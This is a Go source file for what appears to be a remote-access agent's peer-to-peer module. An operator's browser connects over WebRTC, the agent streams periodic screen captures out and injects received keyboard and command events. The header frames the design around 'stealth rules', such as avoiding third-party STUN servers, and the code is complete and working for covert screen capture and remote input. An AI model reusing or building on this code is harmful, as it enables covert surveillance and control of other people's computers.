// P2P bridge (Type2.5, docs/P2P_DESIGN.md): operator browser <-> agent
// WebRTC data channel, signaled over Type1. Stealth rules: no STUN by
// default (host candidates only), PSK-bound auth proof, one live PC per
// agent, idle watchdog, teardown on DTLS close or CmdP2PStop.
package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"sync"
	"sync/atomic"
	"time"

	"github.com/pion/webrtc/v4"

	"wispp/protocol"
)

var (
	p2pMu  sync.Mutex
	p2pPC  *webrtc.PeerConnection
	p2pGen int64 // identifies the live session; stale pumps exit
)

func p2pStop() {
	p2pMu.Lock()
	pc := p2pPC
	p2pPC = nil
	p2pGen++
	p2pMu.Unlock()
	if pc != nil {
		_ = pc.Close()
	}
}

// p2pBridge consumes the browser offer, returns the agent answer (both base64
// SDP). The frame pump runs in the background once the data channel opens.
func p2pBridge(args *protocol.P2PBridgeArgs, psk string) (*protocol.P2PBridgeResult, error) {
	offerB, err := base64.StdEncoding.DecodeString(args.Offer)
	if err != nil {
		return nil, fmt.Errorf("offer b64: %w", err)
	}
	p2pStop() // one session at a time

	pc, err := webrtc.NewPeerConnection(webrtc.Configuration{}) // host candidates only (no third-party STUN)
	if err != nil {
		return nil, err
	}
	// browser side owns the data channel (avoids double-create glare);
	// we adopt whatever channel arrives.
	var dcRef atomic.Pointer[webrtc.DataChannel]
	opened := make(chan struct{})
	var openOnce sync.Once
	pc.OnDataChannel(func(c *webrtc.DataChannel) {
		if c.Label() != "rcp" {
			return
		}
		dcRef.Store(c)
		c.OnOpen(func() { openOnce.Do(func() { close(opened) }) })
	})
	closed := make(chan struct{})
	var closeOnce sync.Once
	pc.OnConnectionStateChange(func(s webrtc.PeerConnectionState) {
		if s == webrtc.PeerConnectionStateFailed || s == webrtc.PeerConnectionStateClosed {
			closeOnce.Do(func() { close(closed) })
			_ = pc.Close()
		}
	})

	if err := pc.SetRemoteDescription(webrtc.SessionDescription{Type: webrtc.SDPTypeOffer, SDP: string(offerB)}); err != nil {
		_ = pc.Close()
		return nil, fmt.Errorf("set offer: %w", err)
	}
	answer, err := pc.CreateAnswer(nil)
	if err != nil {
		_ = pc.Close()
		return nil, err
	}
	gathered := make(chan struct{})
	var gOnce sync.Once
	pc.OnICECandidate(func(c *webrtc.ICECandidate) {
		if c == nil {
			gOnce.Do(func() { close(gathered) })
		}
	})
	if err := pc.SetLocalDescription(answer); err != nil {
		_ = pc.Close()
		return nil, err
	}
	select {
	case <-gathered:
	case <-time.After(8 * time.Second): // host-only ICE: should be instant
	}

	p2pMu.Lock()
	p2pPC = pc
	gen := p2pGen
	p2pMu.Unlock()
	go p2pPump(pc, &dcRef, opened, closed, gen, args.Nonce, psk)

	return &protocol.P2PBridgeResult{
		Answer: base64.StdEncoding.EncodeToString([]byte(pc.LocalDescription().SDP)),
	}, nil
}

// p2pPump waits for the channel, proves identity (agent→browser proof,
// browser→agent ack), then streams captures out and applies input events in.
func p2pPump(pc *webrtc.PeerConnection, dcRef *atomic.Pointer[webrtc.DataChannel], opened, closed chan struct{}, gen int64, nonce, psk string) {
	defer func() {
		_ = pc.Close()
		p2pMu.Lock()
		if p2pGen == gen {
			p2pPC = nil
		}
		p2pMu.Unlock()
		log.Printf("p2p: bridge torn down")
	}()
	select {
	case <-opened:
	case <-closed:
		return
	case <-time.After(25 * time.Second):
		return
	}
	dc := dcRef.Load()
	if dc == nil {
		return
	}

	var lastAct atomic.Int64
	lastAct.Store(time.Now().Unix())
	proofCh := make(chan struct{})
	var authOnce sync.Once
	input := make(chan []byte, 32)
	dc.OnMessage(func(m webrtc.DataChannelMessage) {
		lastAct.Store(time.Now().Unix())
		if !m.IsString {
			return
		}
		var ev struct {
			T string `json:"t"`
		}
		if json.Unmarshal(m.Data, &ev) != nil {
			return
		}
		switch ev.T {
		case "auth-ok":
			authOnce.Do(func() { close(proofCh) })
		case "key", "cmd":
			select {
			case input <- append([]byte(nil), m.Data...):
			default:
			}
		}
	})

	proof, _ := json.Marshal(map[string]string{"t": "auth", "nonce": nonce, "proof": protocol.P2PProof(psk, nonce)})
	if err := dc.SendText(string(proof)); err != nil {
		return
	}
	select {
	case <-proofCh:
	case <-closed:
		return
	case <-time.After(10 * time.Second):
		log.Printf("p2p: auth proof not acknowledged — dropping bridge")
		return
	}
	log.Printf("p2p: direct bridge live (data channel)")

	var seq uint32
	interval := time.Second
	if runtime.GOOS != "darwin" && runtime.GOOS != "windows" && runtime.GOOS != "linux" {
		interval = 5 * time.Second
	}
	tick := time.NewTicker(interval)
	defer tick.Stop()
	watch := time.NewTicker(10 * time.Second)
	defer watch.Stop()
	for {
		select {
		case <-closed:
			return
		case <-watch.C:
			if time.Now().Unix()-lastAct.Load() > 60 {
				return // idle watchdog
			}
		case p := <-input:
			var ev inputEvent
			if json.Unmarshal(p, &ev) == nil {
				inputInject(ev)
			}
		case <-tick.C:
			tmp := filepath.Join(os.TempDir(), "wisp_p2p_view.png")
			if err := captureToFile(tmp); err != nil {
				continue
			}
			compressShot(tmp)
			data, err := os.ReadFile(tmp)
			_ = os.Remove(tmp)
			if err != nil || len(data) == 0 {
				continue
			}
			seq++
			if err := p2pSendFrame(dc, seq, data, closed); err != nil {
				return
			}
		}
	}
}

// p2pSendFrame ships one PNG as ≤60KB chunks ([1|seq|idx|total|payload]) —
// Chrome caps data-channel messages at 256KB — with buffered-amount
// backpressure; bails early if the bridge is being torn down.
func p2pSendFrame(dc *webrtc.DataChannel, seq uint32, data []byte, closed chan struct{}) error {
	const chunk = 60 * 1024
	total := (len(data) + chunk - 1) / chunk
	for i := 0; i < total; i++ {
		for dc.BufferedAmount() > 200*1024 {
			select {
			case <-closed:
				return fmt.Errorf("closed")
			case <-time.After(30 * time.Millisecond):
			}
		}
		end := (i + 1) * chunk
		if end > len(data) {
			end = len(data)
		}
		hdr := []byte{1,
			byte(seq >> 24), byte(seq >> 16), byte(seq >> 8), byte(seq),
			byte(i >> 24), byte(i >> 16), byte(i >> 8), byte(i),
			byte(total >> 24), byte(total >> 16), byte(total >> 8), byte(total)}
		buf := append(hdr, data[i*chunk:end]...)
		if err := dc.Send(buf); err != nil {
			return err
		}
	}
	return nil
}
